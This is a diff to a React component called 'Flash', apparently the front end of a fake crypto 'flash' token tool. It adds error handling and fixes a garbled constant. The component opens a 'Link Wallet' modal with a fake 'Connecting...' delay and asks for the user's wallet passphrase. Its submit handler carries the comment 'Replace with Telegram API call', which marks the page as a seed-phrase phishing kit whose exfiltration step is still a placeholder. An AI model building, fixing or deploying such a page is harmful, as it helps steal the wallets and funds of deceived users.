@@ -11,27 +11,46 @@ export default function Flash() {
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [walletLoading, setWalletLoading] = useState(false);
   const [passphrase, setPassphrase] = useState('');
+  const [error, setError] = useState(null);
 
   useEffect(() => {
-    const timer = setTimeout(() => setIsLoading(false), 10000);
-    return () => clearTimeout(timer);
+    try {
+      const timer = setTimeout(() => setIsLoading(false), 10000);
+      return () => clearTimeout(timer);
+    } catch (err) {
+      setError('Failed to initialize loading timer: ' + err.message);
+    }
   }, []);
 
   const handleFlash = () => {
-    setIsModalOpen(true);
+    try {
+      setIsModalOpen(true);
+    } catch (err) {
+      setError('Flash button error: ' + err.message);
+    }
   };
 
   const handleWalletClick = () => {
-    setWalletLoading(true);
-    setTimeout(() => setWalletLoading(false), 10000);
+    try {
+      setWalletLoading(true);
+      setTimeout(() => setWalletLoading(false), 10000);
+      setPassphrase(''); // Reset passphrase to show input after loading
+    } catch (err) {
+      setError('Wallet connection error: ' + err.message);
+    }
   };
 
   const handleSubmit = () => {
-    alert('Passphrase submitted: ' + passphrase); // Replace with Telegram API call
-    setPassphrase('');
-    setIsModalOpen(false);
+    try {
+      alert('Passphrase submitted: ' + passphrase); // Replace with Telegram API
+      setPassphrase('');
+      setIsModalOpen(false);
+    } catch (err) {
+      setError('Submit error: ' + err.message);
+    }
   };
 
+  if (error) return <div className="container">Error: {error}</div>;
   if (isLoading) return <div className="loading"><div className="spinner"></div></div>;
 
   return (
@@ -44,7 +63,7 @@ export default function Flash() {
         onChange={(e) => setReceiverAddress(e.target.value)}
       />
       <select value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
-        {TOKENライブOPTIONS.map((option) => (
+        {TOKEN_OPTIONS.map((option) => (
           <option key={option} value={option}>{option}</option>
         ))}
       </select>
@@ -52,14 +71,14 @@ export default function Flash() {
 
       {isModalOpen && (
         <div className="modal">
-          <div>
+          <div className="modal-content">
             <h2>Link Wallet</h2>
             {walletLoading ? (
               <div className="loading">
                 <div className="spinner"></div>
                 <p>Connecting...</p>
               </div>
-            ) : passphrase ? (
+            ) : passphrase || walletLoading === false ? (
               <>
                 <input
                   type="text"
@@ -93,4 +112,4 @@ export default function Flash() {
       </div>
     </div>
   );
-         }
+}
